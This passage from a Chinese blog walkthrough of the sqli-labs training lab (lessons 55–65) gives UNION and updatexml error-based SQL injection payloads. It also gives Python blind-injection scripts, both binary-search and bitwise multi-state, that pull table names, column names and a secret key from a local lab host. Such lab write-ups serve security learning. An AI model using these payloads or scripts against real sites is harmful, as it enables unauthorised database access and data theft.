sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;challenges&#x27;</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ZZVWJ42YS5&#x27;</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(secret_VRST) <span class="keyword">from</span> challenges.ZZVWJ42YS5),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>同Less55，闭合方式不一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>同Less56，闭合方式不一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+</span><br></pre></td></tr></table></figure><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>因获取结果通过代码定义的数组，数据库报错也开着，把联合注入为报错注入</p><p>获取表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><p>获取字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ZZVWJ42YS5<span class="string">&#x27; and table_schema=&#x27;</span>challenges<span class="string">&#x27;),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><p>获取key</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>闭合方式不一样，其余见Less-58</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(secret_VRST) <span class="keyword">from</span> challenges.ZZVWJ42YS5),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>闭合方式不一样，其余见Less-58</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>闭合方式不一样，其余见Less-58</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>本关联合注入和报错注入都不行了，需要进行盲注</p><p>但此关限制了只能在 130 步内注入表名和数据字段以及数据，有点难度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><p>常见字符及大小写已经有65个了…</p><p>首先想到二分法，但感觉也不太行</p><p>表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(chars[mid]))</span><br><span class="line">            resp = requests.get(url)</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">        result += chars[left]</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">print</span>(try_count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># ZZVWJ42YS5</span></span><br><span class="line"><span class="comment"># 60</span></span><br></pre></td></tr></table></figure><p>字段名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where table_name=&#x27;ZZVWJ42YS5&#x27; and table_schema=&#x27;challenges&#x27; limit 2,1),8,4),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(chars[mid]))</span><br><span class="line">            resp = requests.get(url)</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">        result += chars[left]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;secret_&#x27;</span> + result)</span><br><span class="line">    <span class="built_in">print</span>(try_count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># secret_VRST</span></span><br><span class="line"><span class="comment"># 24</span></span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr((select secret_VRST from challenges.ZZVWJ42YS5 limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">25</span>):</span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(chars[mid]))</span><br><span class="line">            resp = requests.get(url)</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">        result += chars[left]</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">print</span>(try_count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># 3rhRLEJ2V0XsjdlUsTCS5RJs</span></span><br><span class="line"><span class="comment"># 145</span></span><br></pre></td></tr></table></figure><p>一共花费 229次，而且还是算准了字段长度，并且知道字段名前缀的前提下</p><p>网上搜了下别人的解法，tql orz</p><p><a href="https://www.jianshu.com/p/f1811e108d58">https://www.jianshu.com/p/f1811e108d58</a> </p><p>原来还有多状态这种东西，并且虽然MySQL默认区分大小写，但在用等号 where 取列名字段时，是不区分大小写的，各种骚姿势，被秀到了…</p><p>其实也是通过 <code>substr</code> 每位获取，只不过获取的时候，不用把每位字符（上面二分法脚本里的 <code>chars</code>）一个个判断是否存在，而是通过页面返回结果来进行。但不是说这是盲注嘛？页面还是有返回具体的查询信息的，比如当 id=1时返回用户名为 Angelina（为啥不是数据库的 id 为1的用户名？因为PHP在代码层做了新数组映射），id=2时返回用户名是 Dummy，假如数据表中存在8条数据，我们把结果，假如 <code>ASCII(SUBSTRING((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#39;challenges&#39; limit 1), 1, 1))</code> 是 90，然后ascii可见字符在 0-128，也就是 8 位二进制足以表示。我们不用一位位去匹配字符表的每个字符（上面二分法脚本里的 <code>chars</code>），而是先 <code>90 &amp; 7 (00000111) = 2</code>， <code>90 &amp; 56 (00111000) = 24</code>，<code>90 &amp; 224 (11100000) = 64</code>，然后3种与运算结果通过 case when 把与运算后的情况，弄成8种状态（因为只有3个1，返回只有8种结果），通过页面返回的三种状态，分别是 <code>secure</code>，<code>stupid</code>， <code>secure</code> ，3个状态即可知道这个字符的8位二进制组成，然后就能得出第1个字符的ascii值是90。也就是原本我们需要一个个遍历 <code>.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz</code> 每个字符，根据页面返回判断是否相等，如果该表存在多于8条数据，就能变成只要3次即可获取到1个字符内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-62/index.php&quot;</span>  <span class="comment"># 改成你的地址</span></span><br><span class="line">try_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_bits</span>(<span class="params">query, i, j</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取query执行结果的第 i 个（从1开始算）字符的第 j 位开始的 3 个比特</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> try_count</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x27;+(</span></span><br><span class="line"><span class="string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span></span><br><span class="line"><span class="string">    WHEN &#123;0&#125; THEN 1</span></span><br><span class="line"><span class="string">    WHEN &#123;1&#125; THEN 2</span></span><br><span class="line"><span class="string">    WHEN &#123;2&#125; THEN 3</span></span><br><span class="line"><span class="string">    WHEN &#123;3&#125; THEN 4</span></span><br><span class="line"><span class="string">    WHEN &#123;4&#125; THEN 5</span></span><br><span class="line"><span class="string">    WHEN &#123;5&#125; THEN 6</span></span><br><span class="line"><span class="string">    WHEN &#123;6&#125; THEN 7</span></span><br><span class="line"><span class="string">    ELSE 8</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">)+&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="number">0</span>, <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">1</span>), <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>), <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**(j+<span class="number">1</span>), query=query, bit_mark=<span class="number">2</span>**j + <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**(j+<span class="number">2</span>), i=i)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;\s+&#x27;</span>, <span class="string">&#x27; &#x27;</span>, payload.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">    resp = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    info = &#123;</span><br><span class="line">        <span class="string">&quot;Angelina&quot;</span>: <span class="string">&quot;000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Dummy&quot;</span>: <span class="string">&quot;001&quot;</span>,</span><br><span class="line">        <span class="string">&quot;secure&quot;</span>: <span class="string">&quot;010&quot;</span>,</span><br><span class="line">        <span class="string">&quot;stupid&quot;</span>: <span class="string">&quot;011&quot;</span>,</span><br><span class="line">        <span class="string">&quot;superman&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">        <span class="string">&quot;batman&quot;</span>: <span class="string">&quot;101&quot;</span>,</span><br><span class="line">        <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;110&quot;</span>,</span><br><span class="line">        <span class="string">&quot;admin1&quot;</span>: <span class="string">&quot;111&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    match = re.search(<span class="string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)</span><br><span class="line">    <span class="keyword">assert</span> match</span><br><span class="line">    bits = info.get(match.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">assert</span> bits</span><br><span class="line">    <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_data</span>(<span class="params">query, length</span>):</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        b3 = extract_bits(query, i, <span class="number">0</span>)  <span class="comment"># 00000111</span></span><br><span class="line">        b2 = extract_bits(query, i, <span class="number">3</span>)  <span class="comment"># 00111000</span></span><br><span class="line">        b1 = extract_bits(query, i, <span class="number">5</span>)  <span class="comment"># 11100000</span></span><br><span class="line">        bit = b1[:<span class="number">2</span>] + b2 + b3</span><br><span class="line">        res += <span class="built_in">chr</span>(<span class="built_in">int</span>(bit, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    table_name = extract_data(<span class="string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;table_name:&quot;</span>, table_name)</span><br><span class="line"></span><br><span class="line">    column_name = <span class="string">&quot;secret_&quot;</span> + extract_data(</span><br><span class="line">        <span class="string">&quot;substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit 2,1),8,4)&quot;</span>,</span><br><span class="line">        <span class="number">4</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;column_name:&quot;</span>, column_name)</span><br><span class="line"></span><br><span class="line">    secret_key = extract_data(<span class="string">&quot;select &quot;</span> + column_name + <span class="string">&quot; from challenges.&quot;</span> + table_name, <span class="number">24</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;secret_key:&quot;</span>, secret_key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done. try_count:&quot;</span>, try_count)</span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line"><span class="comment"># table_name: ZZVWJ42YS5</span></span><br><span class="line"><span class="comment"># column_name: secret_VRST</span></span><br><span class="line"><span class="comment"># secret_key: 3rhRLEJ2V0XsjdlUsTCS5RJs</span></span><br><span class="line"><span class="comment"># Done. try_count: 114</span></span><br></pre></td></tr></table></figure><p>过于秀～</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>用Less-62多状态同 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>用Less-62多状态 payload 改一下闭合方式即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span></span><br><span class="line"><span class="string">    WHEN &#123;0&#125; THEN 1</span></span><br><span class="line"><span class="string">    WHEN &#123;1&#125; THEN 2</span></span><br><span class="line"><span class="string">    WHEN &#123;2&#125; THEN 3</span></span><br><span class="line"><span class="string">    WHEN &#123;3&#125; THEN 4</span></span><br><span class="line"><span class="string">    WHEN &#123;4&#125; THEN 5</span></span><br><span class="line"><span class="string">    WHEN &#123;5&#125; THEN 6</span></span><br><span class="line"><span class="string">    WHEN &#123;6&#125; THEN 7</span></span><br><span class="line"><span class="string">    ELSE 8</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="number">0</span>, <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">1</span>), <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>), <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**(j+<span class="number">1</span>), query=query, bit_mark=<span class="number">2</span>**j + <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**(j+<span class="number">2</span>), i=i)</span><br></pre></td></tr></table></figure><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>用Less-62多状态 payload 改一下闭合方式即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    \&quot;+(</span></span><br><span class="line"><span class="string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span></span><br><span class="line"><span class="string">    WHEN &#123;0&#125; THEN 1</span></span><br><span class="line"><span class="string">    WHEN &#123;1&#125; THEN 2</span></span><br><span class="line"><span class="string">    WHEN &#123;2&#125; THEN 3</span></span><br><span class="line"><span class="string">    WHEN &#123;3&#125; THEN 4</span></span><br><span class="line"><span class="string">    WHEN &#123;4&#125; THEN 5</span></span><br><span class="line"><span class="string">    WHEN &#123;5&#125; THEN 6</span></span><br><span class="line"><span class="string">    WHEN &#123;6&#125; THEN 7</span></span><br><span class="line"><span class="string">    ELSE 8</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">)+\&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="number">0</span>, <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">1</span>), <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>), <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**j, <span class="number">2</span>**(j+<span class="number">2</span>) + <span class="number">2</span>**(j+<span class="number">1</span>), query=query, bit_mark=<span class="number">2</span>**j + <span class="number">2</span>**(j+<span class="number">1</span>) + <span class="number">2</span>**(j+<span class="number">2</span>), i=i)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽说用sqlmap是没有灵魂的，不得不说sqlmap是一款是否优秀的开源sql注入工具，为啥说没有灵魂？纯手工刷完靶场后，发现sqlmap给我们隐藏了很多很多的注入细节，所以练习不建议使用～</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://www.sqlsec.com/2020/05/sqlilabs.html">https://www.sqlsec.com/2020/05/sqlilabs.html</a></p><p>[2] <a href="https://www.cnblogs.com/lcamry/p/5763012.html">https://www.cnblogs.com/lcamry/p/5763012.html</a></p><p>[3] <a href="https://www.cnblogs.com/-qing-/p/11610385.html">https://www.cnblogs.com/-qing-/p/11610385.html</a></p><p>[4] <a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> sqli-labs </tag>
            
        </tags>
